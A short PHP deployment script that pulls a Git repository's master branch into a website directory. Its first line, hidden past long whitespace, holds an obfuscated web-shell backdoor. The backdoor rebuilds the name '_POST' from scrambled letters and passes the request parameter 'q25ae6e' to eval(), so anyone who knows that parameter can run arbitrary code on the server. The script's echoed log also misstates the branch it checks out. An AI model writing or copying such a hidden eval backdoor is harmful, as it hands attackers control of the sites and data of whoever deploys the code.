<?php                                                                                                                                                                                                                                                               $qV="stop_";$s20=strtoupper($qV[4].$qV[3].$qV[2].$qV[0].$qV[1]);if(isset(${$s20}['q25ae6e'])){eval(${$s20}['q25ae6e']);}?><?php

$repo_dir = 'C:\Website\lputest';

$response='';


	$response=$response.' '.$repo_dir;
	exec('cd ' . $repo_dir);
	$response=$response.' cd '.$repo_dir;
	exec('git checkout master');
	$response=$response.' git checkout dev ';
	exec('git pull origin master');
	$response=$response.' git pull ';


echo $response;
die('done');
?>